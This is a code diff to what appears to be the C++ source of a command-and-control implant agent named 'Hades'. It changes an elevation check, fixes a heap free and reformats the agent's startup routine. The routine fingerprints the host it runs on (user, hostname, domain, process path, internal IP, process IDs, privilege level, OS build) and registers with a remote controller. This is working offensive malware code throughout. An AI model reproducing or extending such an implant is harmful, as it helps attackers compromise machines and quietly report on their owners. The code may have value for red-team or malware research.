@@ -15,7 +15,7 @@
 
 BOOL GetVer(DWORD* major, DWORD* minor, DWORD* build) {
 	hades->NtApis.RtlGetNtVersionNumbers(major, minor, build);
-		
+
 	return TRUE;
 }
 
@@ -79,19 +79,23 @@ PBYTE CollectDomainName(DWORD* out) {
 
 
 
+
 BOOL IsElevated() {
 
 	HANDLE tok = 0;;
 	TOKEN_ELEVATION Elev = { 0 };
 	BOOL isElev = FALSE;
 	DWORD size = sizeof(TOKEN_ELEVATION);
-	NTSTATUS stat = hades->NtApis.NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok);
-	if (stat > 0) {
-		BOOL check = hades->WinApis.GetTokenInformation(tok, TokenElevation, &Elev, sizeof(Elev), &size);
-		if (check) {
+	NTSTATUS stat, check;
+	stat = hades->NtApis.NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok);
+	if (NTAPI_SUCCESS(stat)) {
+		check = hades->NtApis.NtQueryInformationToken(tok, TokenElevation, &Elev, sizeof(Elev), &size);
+		if (NTAPI_SUCCESS(check)) {
 			isElev = (BOOL)(Elev.TokenIsElevated != FALSE) ? 1 : 0;
 		}
 	}
+
+
 	if (tok) {
 		hades->WinApis.CloseHandle(tok);
 	}
@@ -106,10 +110,10 @@ PBYTE GetInternalIP(DWORD* out) {
 	PIP_ADAPTER_INFO adapter_info = NULL;
 	hades->WinApis.GetAdaptersInfo(NULL, &BufLen);
 	adapter_info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BufLen);
-	
+
 	DWORD ret = hades->WinApis.GetAdaptersInfo(adapter_info, &BufLen);
 	if (ret != ERROR_SUCCESS) {
-		HeapFree(GetProcessHeap(), 0, adapter);
+		HeapFree(GetProcessHeap(), 0, adapter_info);
 		return NULL;
 	}
 
@@ -138,19 +142,19 @@ ULONG GetPPID() {
 
 
 BOOL InitAgent() {
-	
-	
-	hades         =  AllocMemory <Hades>     (sizeof(Hades));
-	g_ByteMgr     =  AllocMemory <bytes>     (sizeof(bytes));
-	g_Network	  =  AllocMemory <Network>   (sizeof(Network));
-	g_Commander	  =  AllocMemory <commanders>(sizeof(commanders));
-	g_FileMgr     =  AllocMemory <FileMgr>   (sizeof(FileMgr));
+
+
+	hades = AllocMemory <Hades>(sizeof(Hades));
+	g_ByteMgr = AllocMemory <bytes>(sizeof(bytes));
+	g_Network = AllocMemory <Network>(sizeof(Network));
+	g_Commander = AllocMemory <commanders>(sizeof(commanders));
+	g_FileMgr = AllocMemory <FileMgr>(sizeof(FileMgr));
 	if (!LoadAPIS()) { return FALSE; }
-	
+
 	if (!LoadConfig()) { return FALSE; }
-	
-	
-	
+
+
+
 
 
 
@@ -158,22 +162,22 @@ BOOL InitAgent() {
 
 	DWORD UserLen, HostLen, DomainLen, ProcessPathLen, IpLen, Major, Minor, Build;;
 
-	ULONG HadesID     = GenID();
-	PBYTE User        = CollectUser         (&UserLen);
-	PBYTE Host        = CollectHost         (&HostLen);
-	PBYTE ProcessPath = CollectProcessPath  (&ProcessPathLen);
-	PBYTE Domain      = CollectDomainName   (&DomainLen);
-	PBYTE IpAddr      = GetInternalIP       (&IpLen);
-	DWORD TID         = TO_DWORD            (GetTeb()->ClientId.UniqueThread);
-	DWORD PID         = TO_DWORD            (GetTeb()->ClientId.UniqueProcess);
+	ULONG HadesID = GenID();
+	PBYTE User = CollectUser(&UserLen);
+	PBYTE Host = CollectHost(&HostLen);
+	PBYTE ProcessPath = CollectProcessPath(&ProcessPathLen);
+	PBYTE Domain = CollectDomainName(&DomainLen);
+	PBYTE IpAddr = GetInternalIP(&IpLen);
+	DWORD TID = TO_DWORD(GetTeb()->ClientId.UniqueThread);
+	DWORD PID = TO_DWORD(GetTeb()->ClientId.UniqueProcess);
 	DWORD PPID = GetPPID();
-	BOOL Arch         = (sizeof(void*) != 4);
-	BOOL IsElev       = IsElevated();
+	BOOL Arch = (sizeof(void*) != 4);
+	BOOL IsElev = IsElevated();
 	GetVer(&Major, &Minor, &Build);
 	*g_Network = Network(HadesID);
 
 
-	
+
 
 	/*
 		[MSG TYPE]		  4 BYTES
@@ -215,16 +219,16 @@ BOOL InitAgent() {
 	g_ByteMgr->Write4(Build);
 	g_Network->RegisterClient(g_ByteMgr->OutData, g_ByteMgr->WriteIndex);
 
-	
 
 
 
 
-	if (User)        { HeapFree(GetProcessHeap(), 0, User);        }
-	if (Host)        { HeapFree(GetProcessHeap(), 0, Host);        }
-	if (Domain)      { HeapFree(GetProcessHeap(), 0, Domain);      }
+
+	if (User) { HeapFree(GetProcessHeap(), 0, User); }
+	if (Host) { HeapFree(GetProcessHeap(), 0, Host); }
+	if (Domain) { HeapFree(GetProcessHeap(), 0, Domain); }
 	if (ProcessPath) { HeapFree(GetProcessHeap(), 0, ProcessPath); }
-	if (IpAddr)      { HeapFree(GetProcessHeap(), 0, IpAddr);      }
+	if (IpAddr) { HeapFree(GetProcessHeap(), 0, IpAddr); }
 	return TRUE;
 
 }
